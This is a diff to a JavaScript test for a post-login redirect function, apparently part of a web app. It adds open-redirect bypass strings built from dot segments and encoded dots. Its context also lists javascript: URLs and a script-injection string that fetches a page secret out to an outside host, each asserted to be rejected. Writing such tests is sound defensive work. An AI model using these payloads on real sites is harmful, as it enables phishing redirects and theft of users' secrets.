@@ -95,6 +95,11 @@ test('where the gate sends you after signing in is a path on this host, or /', a
     'javascript:alert(1)', 'JavaScript:alert(1)', ' /a', 'https://evil.example/', '/\t/evil.example', '/\n/evil.example',
     "');fetch('https://x/?'+this.secret.value);('", '/a\u0000b', '/a\u007fb',
   ];
+  // Dot segments the parser removes can leave a leading // behind.
+  home.push(
+    '/.//evil.example', '/./\\evil.example', '/.\\/evil.example', '/a/..//evil.example', '/..//evil.example',
+    '/%2e//evil.example', '/%2E%2E//evil.example', '/a/../\\evil.example', '/././/evil',
+  );
   for (const to of home) assert.equal(returnPath(to), '/', JSON.stringify(to));
   assert.equal(returnPath('/a/drive?x=1'), '/a/drive?x=1');
   assert.equal(returnPath('/a/My%20Notes#top'), '/a/My%20Notes#top');
